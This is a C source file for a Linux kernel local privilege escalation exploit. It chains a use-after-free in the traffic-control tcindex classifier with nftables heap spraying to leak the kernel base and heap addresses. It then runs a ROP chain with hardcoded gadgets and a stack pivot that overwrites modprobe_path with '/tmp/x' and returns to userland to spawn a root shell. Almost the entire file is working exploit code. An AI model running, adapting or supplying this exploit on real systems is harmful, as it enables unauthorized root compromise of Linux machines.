
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <pthread.h>
#include <time.h>

#include <linux/if_ether.h>
#include <linux/tc_act/tc_mirred.h>
#include <linux/netlink.h>
#include <net/if.h>
#include <linux/rtnetlink.h>

#include "rtnetlink.h"
#include "modprobe_path.h"
#include "setup.h"
#include "cls.h"
#include "log.h"
#include "local_netlink.h"
#include "keyring.h"
#include "uring.h"

#define MAX_SPRAY_OBJS 13
#define MAX_SPRAY_TABLES 10
#define MAX_SPRAY_TABLES2 20

uint64_t kbase=0, modprobe_path=0, kheap=0;
void final_step(void);

uint64_t kbase_test = 0xffffffff81000000;
uint64_t stack_pivot = 0xffffffff812f3984; // : push r12 ; add bl, byte ptr [rbp + 0x41] ; pop rsp ; ret
uint64_t ret = 0xffffffff815f1a43; // ret
uint64_t add_rsp_70h_pop_rbp_ret = 0xffffffff817854a1; // add_rsp_70h_pop_rbp_ret

uint64_t pop_rax_ret = 0xffffffff81cca9c4;         // pop rax ; ret
uint64_t pop_rsi_ret = 0xffffffff81001eba; //  pop rsi ; ret
uint64_t mov_qword_rax_rsi = 0xffffffff812258fa; // mov    QWORD PTR [rax+0x18],rsi ; ret
uint64_t kpti_trampoline = 0xffffffff81e00e66; // swapgs_restore_regs_and_return_to_usermode + 22


/* Saved userland registers */
uint64_t user_rip = (uint64_t)final_step;
uint64_t user_cs = 0;
uint64_t user_rflags = 0;
uint64_t user_sp = 0;
uint64_t user_ss = 0;

void final_step(void)
{
    int pid=0;

    puts("[+] Done");
    setup_modprobe_payload();
    puts("[+] Get root shell");
    get_root_shell();
}

/* Save initial userland registers */
void save_state()
{

    asm (
        ".intel_syntax noprefix;"
        "mov %[user_cs], cs;"
        "mov %[user_ss], ss;"
        "mov %[user_sp], rsp;"
        "pushf;"
        "pop %[user_rflags];"
        ".att_syntax;"
        : [user_cs] "=r" (user_cs), [user_ss] "=r" (user_ss),
          [user_sp] "=r" (user_sp), [user_rflags] "=r" (user_rflags)
    );

    puts("[*] Saved state");

}


int check_table(char *table_name){
    uint64_t *ptr = NULL;
    int res = 0;

    ptr = (uint64_t *)dump_table(table_name);
    if (ptr[26]!=0x1122334455667788){
        res = 1;
        printf("\tptr[26]: 0x%lx\n", ptr[26]);
    }
    free(ptr);
    return res;
}

void spray_part2(struct mnl_socket *nl){
    uint64_t value[32];
    char *table_name = NULL;
    uint64_t delta = kbase - kbase_test;

    memset(value, 0, 0x100);
    value[4] = kheap; // object name
    value[5] = 0; // genmask 

    value[0x10] = kheap+0x10; 

    /* fake ops + stack pivot*/
    value[8] = kheap+0x10+8; // +0x30
    value[7] = 0x1;// type
    value[6] = stack_pivot-kbase_test+kbase;// dump function 

    /* Rop */
    value[0] = ret + delta; 
    value[1] = ret + delta;
    value[2] = ret + delta;
    value[3] = add_rsp_70h_pop_rbp_ret + delta;
    value[0x13] = pop_rsi_ret + delta;
    value[0x14] = 0x782f706d742f;  

    value[0x15] = pop_rax_ret + delta; //  : pop rax ; ret
    value[0x16] = modprobe_path - 0x18;
    value[0x17] = mov_qword_rax_rsi + delta; // : mov qword ptr [rax + 8], rsi ; ret
    value[0x18] = kpti_trampoline + delta; // swapgs_restore_regs_and_return_to_usermode + 22
    value[0x19] = 0x0;   // dummy rax
    value[0x1a] = 0x0;  // dummy rdi

    value[0x1b] = user_rip;
    value[0x1c] = user_cs;
    value[0x1d] = user_rflags;
    value[0x1e] = user_sp;
    value[0x1f] = user_ss;


    /* */
    table_name = malloc(0x20);
    memset(table_name, 0, 0x20);
    memset(table_name, 0x45, 20);
    for(int i=0; i<MAX_SPRAY_TABLES2; i++){
        table_name[19] = i;
        create_table_with_data(nl, table_name, value, 0x100);
    }
}


int main()
{
    int pid, client_pid, race_pid;
    struct sockaddr_nl snl;
    char link_name[] = "lo\0"; // tunl0 sit0 br0
    pthread_t thread[3];
    int iret[3];
    uint64_t sock;
    unsigned int link_id, lo_link_id;
    char *table_name = NULL, *obj_name=NULL, *table_object=NULL, *table_name2=NULL;
    uint64_t value[32];
    uint64_t addr_value = 0;
    uint64_t table_uaf = 0;
    uint64_t *buf_leak = NULL;
    struct mnl_socket *nl = NULL;
    int found = 0, idx_table = 1;
    uint64_t obj_handle = 0;

    srand(time(NULL));
    assign_to_core(DEF_CORE);

    if (setup_sandbox() < 0){
        errout("[-] setup faild");
    }
    puts("[+] Get CAP_NET_ADMIN capability");

    save_state();
    nl = mnl_socket_open(NETLINK_NETFILTER);
    if (!nl){
        errout("mnl_socket_open");
    }
    puts("[+] Open netlink socket ");

    /* classifiers netlink socket creation */
    if ((sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE)) < 0) {
        errout("socket");
    }

    /* source netlink sock */
    memset(&snl, 0, sizeof(snl));
    snl.nl_family = AF_NETLINK;
    snl.nl_pid = getpid();
    if (bind(sock, (struct sockaddr *)&snl, sizeof(snl)) < 0)
        errout("bind");
    
    /*========================Make leaking step later more stables=======================================*/
    /* Use for leaking */
    int link_tunl0_id = 4;
    rt_newqdisc(sock, link_tunl0_id, 0x10000);
    rt_addclass(sock, link_tunl0_id, 0x00001); // class
    for (int i=2; i<20; i++){
        rt_add_flow_filter(sock, link_tunl0_id, i);
    }
    rt_delchain(sock, link_tunl0_id);
    sleep(3);

    /* ========================Enable lo interface=======================================*/
    // rt_newlink(sock, link_name);
    link_id = rt_getlink(sock, link_name);
    printf("[+] link_id: 0x%x\n", link_id);
    rt_setlink(sock, link_id);

    rt_newqdisc(sock, link_id, 0x10000);
    rt_addclass(sock, link_id, 0x00001); // class
    rt_addfilter(sock, link_id, 2, 1);

    /* =============================================================== */
    rt_delfilter(sock, link_id, 1);
    sleep(3);

    /* =============================================================== */


    printf("[+] Spray %d tables with data's chunk size 0x100\n", MAX_SPRAY_TABLES);
    memset(value, 0, 0x100);
    value[0] = 0;
    /* make sure value[0] = 0 --> for tcindex_destroy doesn't crash */
    for (int i=1; i<20; i++) value[i] = 0x1122334455667788;

    table_name = malloc(0x20);
    memset(table_name, 0, 0x20);
    memset(table_name, 0x41, 20);
    for (char i=1; i<=MAX_SPRAY_TABLES; i++){
        table_name[19] = i;
        create_table_with_data(nl, table_name, value, 0x100);
    }

    sleep(2);
    /* make sure we can realloc this chunk for one table data */
    puts("[+] Destroy exts->actions part 2");
    rt_delchain(sock, link_id); // delete exts->actions -> it calls tcindex_destroy()
    sleep(5);

    puts("[+] check table data");
    for (char i=1; i<=MAX_SPRAY_TABLES; i++){
        table_name[19] = i;
        if (!check_table(table_name)){
            delete_table(nl, table_name);
        } else {
            table_uaf = i;
        }
    }
    sleep(3);

    printf("table_uaf: %ld\n", table_uaf);
    if (table_uaf==0){
        puts("[-] Spray table->udata can't reuse chunk");
        exit(1);
    }
    puts("[+] Reuse chunk success!!!");

    sleep(3);
    /* =============================================================== */

    printf("[+] Spray %d nft_object\n", MAX_SPRAY_OBJS);
    obj_name = malloc(0x20);
    memset(obj_name, 0, 0x20);
    memset(obj_name, 0x42, 20);
    
    table_object = malloc(0x20);
    memset(table_object, 0, 0x20);
    memset(table_object, 0x45, 20);
    table_object[19] = idx_table;
    create_table(nl, table_object);

    for (int i=1; i<=MAX_SPRAY_OBJS; i++){
        obj_name[19] = i;
        create_obj(nl, table_object, obj_name);
    }
    puts("[+] Reclaim part 2");

    /* leaking */
    table_name[19] = table_uaf;
    buf_leak = (uint64_t *)dump_table(table_name);

    kbase = buf_leak[26];
    kbase = kbase - 0x133ae80; // nft_counter_obj_ops
    modprobe_path = kbase + 0x1867a60; // modprobe_path
    kheap = buf_leak[10];
    obj_handle = buf_leak[17];
    

    printf("[+] kbase: 0x%lx\n", kbase);
    printf("[+] kheap: 0x%lx\n", kheap);
    printf("[+] modprobe_path: 0x%lx\n", modprobe_path);
    // handle of UAF nft_object

    delete_table(nl, table_name);
    sleep(2); // waiting for UAF chunk deleted

    /* Free some nft_object */
    for (int i=1; i<=MAX_SPRAY_OBJS; i++){
        if (i==obj_handle) continue;
        obj_name[19] = i;
        del_obj(nl, table_object, obj_name);
    }

    sleep(3);
    puts("[+] Reclaim part 3");
    spray_part2(nl);
    sleep(3);

    /* Trigger */
    puts("[+] Trigger ");
    obj_name[19] = obj_handle;
    get_obj(table_object, obj_name);

clean_table:
    /* clean table */
    delete_table(nl, table_object);
    puts("[+] Clean tables");
    for (int i=0; i<MAX_SPRAY_TABLES2; i++){
        table_name[19] = i;
        delete_table(nl, table_name);
    }

    return 0;
}
